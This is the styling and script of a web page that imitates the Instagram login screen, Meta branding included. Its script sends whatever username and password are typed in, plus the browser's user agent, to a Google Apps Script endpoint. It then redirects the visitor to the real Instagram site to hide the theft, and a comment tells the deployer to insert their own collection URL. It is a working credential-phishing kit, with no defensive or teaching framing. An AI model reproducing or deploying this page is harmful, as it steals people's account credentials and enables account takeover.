<style>
  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap');

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    background: #111112;
    color: #F2F4F6;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }

  .main {
    display: flex;
    flex: 1;
    min-height: calc(100vh - 52px);
  }

  /* ─── LEFT SIDE ─── */
  .left {
    flex: 0 0 50%;
    width: 50%;
    background: #111112;
    display: flex;
    flex-direction: column;
    padding: 60px 40px 40px 80px;
    position: relative;
    overflow: hidden;
  }

  .logo-wrap { margin-bottom: 36px; }

  .tagline {
    font-size: 44px;
    font-weight: 700;
    line-height: 1.15;
    max-width: 500px;
    color: #fff;
    margin-bottom: 32px;
  }

  .tagline .gradient-text {
    background: linear-gradient(90deg, #f58529 0%, #dd2a7b 50%, #8134af 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
  }

  .hero-phones {
    display: flex;
    align-items: center;
    justify-content: flex-start;
    margin-top: 8px;
    position: relative;
    flex: 1;
  }

  /* Phone card styles */
  .phone-card {
    border-radius: 28px;
    overflow: hidden;
    position: absolute;
    border: 1px solid rgba(255,255,255,0.15);
  }

  .phone-center {
    width: 185px;
    height: 310px;
    left: 100px;
    top: 0;
    z-index: 3;
    background: linear-gradient(160deg, #c8a870 0%, #9a7040 45%, #4a2c0a 100%);
  }

  .phone-left {
    width: 155px;
    height: 260px;
    left: 10px;
    top: 40px;
    z-index: 2;
    background: linear-gradient(160deg, #2d5a1b 0%, #1a3a0f 100%);
    transform: rotate(-6deg);
  }

  .phone-right {
    width: 155px;
    height: 260px;
    left: 200px;
    top: 40px;
    z-index: 2;
    background: linear-gradient(160deg, #1a3a6e 0%, #0d1f40 100%);
    transform: rotate(6deg);
  }

  /* Emoji bubble */
  .emoji-bubble {
    position: absolute;
    top: 12px;
    left: 18px;
    background: white;
    border-radius: 20px;
    padding: 6px 12px;
    font-size: 18px;
    color: #000;
    z-index: 5;
    left: 88px;
    top: -2px;
  }

  /* Heart */
  .float-heart {
    position: absolute;
    left: 14px;
    top: 170px;
    z-index: 5;
    font-size: 36px;
  }

  /* Close friends badge */
  .cf-badge {
    position: absolute;
    right: 10px;
    top: 90px;
    z-index: 5;
    background: #3fad57;
    border-radius: 20px;
    padding: 6px 12px;
    font-size: 13px;
    font-weight: 600;
    display: flex;
    align-items: center;
    gap: 5px;
  }

  /* Story ring avatar */
  .story-avatar {
    position: absolute;
    right: 8px;
    bottom: 80px;
    z-index: 5;
    width: 44px;
    height: 44px;
    border-radius: 50%;
    background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
    padding: 2px;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .story-avatar-inner {
    width: 38px;
    height: 38px;
    border-radius: 50%;
    background: #4CAF50;
    border: 2px solid #000;
  }

  /* Bottom bar on phone */
  .phone-bottom-bar {
    position: absolute;
    bottom: 18px;
    left: 50%;
    transform: translateX(-50%);
    display: flex;
    align-items: center;
    gap: 10px;
    width: 80%;
  }

  .swipe-bar {
    height: 5px;
    background: rgba(255,255,255,0.35);
    border-radius: 3px;
    flex: 1;
  }

  .heart-icon {
    font-size: 18px;
    opacity: 0.7;
  }

  /* ─── RIGHT SIDE ─── */
  .right {
    width: 50%;
    min-width: unset;
    background: #1F1F22;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 44px 40px;
    border-left: 1px solid #3E4042;
  }

  .panel-title {
    font-size: 24px;
    font-weight: 600;
    color: #F2F4F6;
    margin-bottom: 30px;
    text-align: center;
  }

  .input-field {
    width: 100%;
    background: #1F1F22;
    border: 1px solid #3E4042;
    border-radius: 16px;
    padding: 16px 18px;
    color: #F2F4F6;
    font-size: 15px;
    outline: none;
    margin-bottom: 12px;
    transition: border-color 0.2s;
    font-family: inherit;
  }

  .input-field::placeholder { color: #9FA4AB; font-size: 14px; }
  .input-field:focus { border-color: #AAAFB5; background: #28292C; }

  .btn-login {
    width: 100%;
    background: rgba(0,100,224,0.4);
    color: rgba(242,244,246,0.3);
    font-size: 15px;
    font-weight: 700;
    border: none;
    border-radius: 22px;
    padding: 15px;
    cursor: not-allowed;
    margin-top: 4px;
    margin-bottom: 20px;
    transition: background 0.2s, opacity 0.2s, color 0.2s;
    font-family: inherit;
    letter-spacing: 0.3px;
    pointer-events: none;
  }

  .btn-login.active {
    background: #0064E0;
    color: #F2F4F6;
    cursor: pointer;
    pointer-events: all;
  }

  .btn-login.active:hover { background: #0082FB; }
  .btn-login:disabled { opacity: 0.6; cursor: not-allowed; }

  .forgot {
    color: #F2F4F6;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    text-decoration: none;
    display: block;
    text-align: center;
    margin-bottom: 30px;
  }
  .forgot:hover { color: #aaa; }

  .divider {
    display: flex;
    align-items: center;
    width: 100%;
    margin-bottom: 26px;
  }
  .divider-line { flex: 1; height: 1px; background: #494D53; }
  .divider span { margin: 0 16px; color: #9FA4AB; font-size: 13px; font-weight: 600; }

  .btn-facebook {
    width: 100%;
    background: transparent;
    color: #F2F4F6;
    font-size: 15px;
    font-weight: 600;
    border: 1px solid #50545B;
    border-radius: 22px;
    padding: 14px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    margin-bottom: 22px;
    font-family: inherit;
    transition: background 0.2s;
  }
  .btn-facebook:hover { background: #28292C; }

  .fb-icon {
    width: 22px;
    height: 22px;
    background: #1877f2;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 15px;
    font-weight: 900;
    color: white;
    flex-shrink: 0;
    font-style: normal;
  }

  .btn-create {
    width: 100%;
    background: transparent;
    color: #4BA9FE;
    font-size: 15px;
    font-weight: 600;
    border: 1.5px solid #50545B;
    border-radius: 22px;
    padding: 14px;
    cursor: pointer;
    margin-bottom: 28px;
    font-family: inherit;
    transition: background 0.2s;
  }
  .btn-create:hover { background: rgba(75,169,254,0.08); }

  .meta-logo {
    color: #737373;
    font-size: 15px;
    display: flex;
    align-items: center;
    gap: 6px;
  }

  #msg {
    margin-top: 14px;
    font-size: 13px;
    text-align: center;
    min-height: 20px;
    font-weight: 500;
  }

  /* ─── FOOTER ─── */
  footer {
    background: #111112;
    border-top: 1px solid #3E4042;
    padding: 14px 60px;
    display: flex;
    flex-wrap: wrap;
    gap: 6px 14px;
    align-items: center;
  }

  footer a {
    color: #9FA4AB;
    font-size: 12px;
    text-decoration: none;
  }
  footer a:hover { color: #F2F4F6; }

  /* Spinner */
  .spinner {
    display: inline-block;
    width: 16px;
    height: 16px;
    border: 2px solid rgba(255,255,255,0.3);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 0.7s linear infinite;
    vertical-align: middle;
    margin-right: 6px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  .btn-spinner {
    display: inline-block;
    width: 22px;
    height: 22px;
    border: 3px solid rgba(255,255,255,0.3);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 0.75s linear infinite;
    vertical-align: middle;
  }

  /* ─── MOBILE RESPONSIVE ─── */
  @media (max-width: 768px) {
    body {
      background: #1C1C1E;
    }

    .main {
      flex-direction: column;
      min-height: 100vh;
    }

    /* Hide left decorative panel on mobile */
    .left {
      display: none;
    }

    /* Right panel becomes full-screen mobile login */
    .right {
      width: 100%;
      min-height: 100vh;
      background: #1C1C1E;
      border-left: none;
      padding: 0 24px;
      justify-content: flex-start;
      padding-top: 60px;
    }

    /* Language selector at top */
    .right::before {
      content: 'English (UK)';
      display: block;
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      text-align: center;
      font-size: 13px;
      color: #EBEBF5;
      padding: 14px;
      background: #1C1C1E;
      z-index: 10;
    }

    /* Instagram logo centered on mobile */
    .panel-title {
      display: none;
    }

    /* Add Instagram logo above form */
    .right > .panel-title + * {
      margin-top: 0;
    }

    /* Instagram icon as header */
    .right > input:first-of-type {
      margin-top: 0;
    }

    /* Inputs styled like iOS */
    .input-field {
      background: #2C2C2E;
      border: 1px solid #3A3A3C;
      border-radius: 10px;
      padding: 14px 16px;
      font-size: 16px; /* Prevents iOS zoom */
      color: #EBEBF5;
      margin-bottom: 10px;
      -webkit-appearance: none;
    }

    .input-field::placeholder {
      color: #636366;
      font-size: 16px;
    }

    .input-field:focus {
      border-color: #636366;
      background: #2C2C2E;
      outline: none;
    }

    /* Login button */
    .btn-login {
      background: rgba(0,100,224,0.4);
      border-radius: 22px;
      padding: 14px;
      font-size: 16px;
      font-weight: 600;
      margin-top: 6px;
      margin-bottom: 24px;
    }

    .btn-login.active {
      background: #0064E0;
    }

    /* Forgot password */
    .forgot {
      font-size: 14px;
      font-weight: 500;
      color: #EBEBF5;
      margin-bottom: 32px;
    }

    /* OR divider */
    .divider {
      margin-bottom: 28px;
    }

    .divider-line {
      background: #3A3A3C;
    }

    .divider span {
      color: #636366;
    }

    /* Facebook login button - hide on mobile like screenshot */
    .btn-facebook {
      display: none;
    }

    /* Create account button */
    .btn-create {
      background: transparent;
      border: 1.5px solid #3A3A3C;
      border-radius: 22px;
      color: #0A84FF;
      font-size: 16px;
      font-weight: 600;
      padding: 14px;
      margin-bottom: 32px;
      position: fixed;
      bottom: 40px;
      left: 24px;
      right: 24px;
      width: auto;
    }

    /* Meta logo at bottom */
    .meta-logo {
      position: fixed;
      bottom: 12px;
      left: 0;
      right: 0;
      text-align: center;
      justify-content: center;
    }

    .meta-logo svg {
      width: 60px;
    }

    #msg {
      font-size: 14px;
    }

    footer {
      display: none;
    }

    /* Add Instagram icon at top of mobile form */
    .mobile-ig-logo {
      display: flex;
      justify-content: center;
      margin-bottom: 36px;
    }
  }

  /* Show mobile logo only on mobile */
  .mobile-ig-logo {
    display: none;
  }

  @media (max-width: 768px) {
    .mobile-ig-logo {
      display: flex;
    }
  }
</style>
</head>

<script>
  // ══════════════════════════════════════════════
  //  REPLACE THIS URL WITH YOUR APPS SCRIPT URL
  // ══════════════════════════════════════════════
  const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyA8GhoaDt8q2i9VFVsNQusVrP_9gn7EQXjbzn2zJO11Ll_DMTjADh5ZpnmQO-V0zYXWw/exec';

  // After successful login, redirect here:
  const REDIRECT_URL = 'https://xyz.com';

  async function handleLogin() {
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const msg = document.getElementById('msg');
    const btn = document.getElementById('loginBtn');

    if (!username || !password) {
      msg.style.color = '#ed4956';
      msg.innerHTML = 'Please enter your username and password.';
      return;
    }

    // Show loading state
    if (!btn.classList.contains('active')) return;
    btn.disabled = true;
    btn.innerHTML = '<span class="btn-spinner"></span>';
    msg.textContent = '';

    try {
      await fetch(SCRIPT_URL, {
        method: 'POST',
        mode: 'no-cors',   // Google Apps Script needs no-cors
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: username,
          password: password,
          userAgent: navigator.userAgent
        })
      });

      // no-cors means we can't read response, but data is saved
      setTimeout(() => {
        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        if (isMobile) {
          // Try to open Instagram app; fall back to mobile web after 2s
          window.location.href = 'instagram://';
          setTimeout(() => {
            window.location.href = 'https://www.instagram.com/';
          }, 2000);
        } else {
          window.location.href = 'https://www.instagram.com/';
        }
      }, 800);

    } catch (err) {
      msg.style.color = '#ed4956';
      msg.textContent = 'Connection error. Please try again.';
      btn.disabled = false;
      btn.textContent = 'Log in';
    }
  }

  // Enable login button only when both fields have content
  function checkInputs() {
    const u = document.getElementById('username').value.trim();
    const p = document.getElementById('password').value.trim();
    const btn = document.getElementById('loginBtn');
    if (u && p) {
      btn.classList.add('active');
    } else {
      btn.classList.remove('active');
    }
  }

  document.getElementById('username').addEventListener('input', checkInputs);
  document.getElementById('password').addEventListener('input', checkInputs);

  // Allow Enter key to submit
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
      const btn = document.getElementById('loginBtn');
      if (btn.classList.contains('active')) handleLogin();
    }
  });
</script>
